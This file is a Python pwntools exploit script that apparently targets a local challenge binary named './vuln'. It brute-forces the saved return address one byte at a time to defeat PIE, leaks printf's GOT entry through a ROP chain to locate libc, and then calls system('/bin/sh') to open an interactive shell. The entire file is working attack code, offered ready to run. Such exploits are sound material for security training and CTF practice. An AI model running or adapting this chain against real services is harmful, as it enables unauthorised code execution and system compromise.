#!/usr/bin/env python3

from pwn import *
import time
# NOTE: this path cannot contain spaces
process_name = './vuln'

input_msg = b"Enter a string : "
end_msg = b"Ended !\n"
exit_msg = "Program finished !\n"
_init_addr = 0x1000 # _init
raw_main_addr = 0x11f1 # main function | (gdb)> x main
raw_printf_addr = 0x1030 # printf@plt
raw_printf_got_addr = 0x4020 # printf@got
raw_pop_rdi_gadget_addr = 0x129b # ROPgadget --binary <exec> | grep "pop rdi ; rdi"

p = process(process_name)

elf = ELF(process_name) # Extract data from binary

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf) # Find ROP gadgets

def find_libc_base(buffer_payload, func_got_addr, func_name):
    # Create rop chain
    rop = buffer_payload
    rop += p64(REAL_POP_RDI_GADGET_ADDR)
    rop += p64(func_got_addr) # args[0] -> RDI
    rop += p64(REAL_PRINTF_PLT_ADDR) # printf()
    rop += p64(REAL_MAIN_PLT_ADDR) # main()

    # Send our rop-chain payload
    print(p.clean())
    p.sendline(rop)

    # Parse leaked address
    leaked_string = p.recvuntil(input_msg)
    #print("Raw leak : "+get_bytes(leaked_string))
    recieved = leaked_string.replace(input_msg, b"").strip()
    recieved = recieved.replace(end_msg, b"").strip()
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info("Leaked libc address of 0x"+hex(func_got_addr)+"@GOT : "+hex(leak))

    libc_addr = -1
    if libc != "":
        libc_addr = leak - libc.symbols[func_name] # Save libc base

    return libc_addr

def get_bytes(s):
    return str(",".join("0x{:02x}".format(c) for c in s))

def bruteforce_next_byte(payload):
    for i in range(256):
        next_test = i
        next_test = bytes([next_test])
        test_payload = payload + next_test
        p.send(test_payload)
        output = p.recvuntil(input_msg)
        if exit_msg in output.decode():
            log.success("Found next byte : %s" % hex(i))
            return next_test
        if i == 255:
            log.fail("Failed to find next byte")
            exit()
def brute_force_bytes(payload, length):
    out = b''
    for i in range(length):
        out = out + bruteforce_next_byte(payload + out)
    ret = u64(out.ljust(8, b"\x00")) # we fill the empty bytes (if their exists) with 0x00
    return ret

padding = b'A'*(64+8)

p.clean()
payload = padding

log.info("Brute forcing RIP...")
rip = brute_force_bytes(payload, 8)
log.info(f"Found rip value: {hex(rip)}")

# We also need to substract _init address from them all
base_address = rip - (rip & 0xfff) - _init_addr
log.info("Found program base address : "+hex(base_address))
# Now that we have the actual base address, we've defeated PIE
REAL_MAIN_PLT_ADDR = base_address + raw_main_addr
REAL_PRINTF_PLT_ADDR = base_address + raw_printf_addr
REAL_PRINTF_GOT_ADDR = base_address + raw_printf_got_addr
REAL_POP_RDI_GADGET_ADDR = base_address + raw_pop_rdi_gadget_addr

log.info("Found main function address : " + hex(REAL_MAIN_PLT_ADDR))
log.info("Found printf@plt address : " + hex(REAL_PRINTF_PLT_ADDR))
log.info("Found pop rdi ; ret gadget address : " + hex(REAL_POP_RDI_GADGET_ADDR))

libc_base_addr = find_libc_base(payload, REAL_PRINTF_GOT_ADDR, "printf")
log.info("Found libc base address : "+hex(libc_base_addr))
# We have to do this AFTER doing get_addr once. get_addr will set the base address of libc, which will then automatically be added to our search
# If we do this before setting libc, we will just get the address without the ASLR padding
BIN_SH = libc_base_addr + next(libc.search(b"/bin/sh"))
log.info("Found \"/bin/sh\" string address in libc : "+hex(BIN_SH))
SYSTEM = libc_base_addr + libc.sym["system"]
log.info("Found system function address in libc : "+hex(SYSTEM))

pay = payload
pay += p64(REAL_POP_RDI_GADGET_ADDR)
pay += p64(BIN_SH)
pay += p64(SYSTEM)

print(p.clean())
p.sendline(pay)

# Receive all data that the application sent us that we have not yet processed and print it
print(p.clean())
# Start interaction with application
p.interactive()
